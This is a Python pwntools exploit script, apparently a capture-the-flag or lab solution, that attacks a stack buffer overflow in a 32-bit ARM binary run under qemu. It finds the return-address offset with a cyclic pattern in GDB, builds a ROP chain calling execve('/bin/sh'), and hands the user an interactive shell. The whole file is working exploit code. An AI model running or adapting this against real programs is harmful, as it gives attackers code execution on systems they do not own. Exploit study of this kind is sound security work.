#!/usr/bin/env python3

import os
from pwn import *
import argparse

context.arch = 'arm'  # Set the architecture to 32-bit ARM
context.endian = 'little'  # Set the endianness
context.os = 'linux'

def find_offset(binary_path):
    """Finds the offset to the return address using GDB."""
    log.info("Finding buffer overflow offset using GDB...")
    pattern = cyclic(200, n=4)  # Generate a pattern of length 200

    # Prepare GDB commands
    gdb_commands = [
        "set pagination off",
        "run",
        "info registers pc",
        "quit"
    ]

    # Write GDB commands to a file
    with open("gdb_script.gdb", "w") as f:
        for cmd in gdb_commands:
            f.write(cmd + "\n")

    # Run GDB with the commands
    gdb_command = [
        "gdb-multiarch",
        "-q",
        "--batch",
        "-x", "gdb_script.gdb",
        "--args", "qemu-arm", binary_path
    ]

    # Run the process and provide the pattern as input
    try:
        p = process(gdb_command)
        p.sendline(pattern)
        gdb_output = p.recvall().decode()
    except Exception as e:
        log.error(f"GDB failed: {e}")
        return -1

    # Extract the PC value
    pc_match = re.search(r'pc\s+0x([a-fA-F0-9]+)', gdb_output)
    if not pc_match:
        log.error("Failed to extract PC value from GDB output.")
        return -1

    pc = int(pc_match.group(1), 16)
    log.info(f"Extracted PC: {hex(pc)}")

    # Find the offset
    try:
        offset = cyclic_find(pc, n=4)
        log.success(f"Found offset: {offset}")
    except ValueError:
        log.error("Failed to find offset in the cyclic pattern.")
        offset = -1

    return offset


def build_rop_chain(binary_path, bin_sh_addr):
    """Builds the ROP chain to execute execve('/bin/sh', NULL, NULL)."""
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Find gadgets
    rop.call('execve', [bin_sh_addr, 0, 0])

    log.info("ROP chain:")
    log.info(rop.dump())
    return rop.chain()

def exploit(binary_path):
    offset = find_offset(binary_path)

    # Load the binary
    elf = ELF(binary_path)

    # Address of "/bin/sh" string in the binary or write it to memory
    bin_sh = next(elf.search(b'/bin/sh\x00'))

    # Build the ROP chain
    rop_chain = build_rop_chain(binary_path, bin_sh)

    # Construct the payload
    payload = fit({
        offset: rop_chain
    }, length=offset + len(rop_chain))

    # Run the binary and send the payload
    p = process(['qemu-arm', binary_path])
    p.sendline(payload)
    p.interactive()  # Get an interactive shell

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for vuln_program")
    parser.add_argument("binary", help="Path to the vulnerable binary")
    args = parser.parse_args()

    exploit(args.binary)
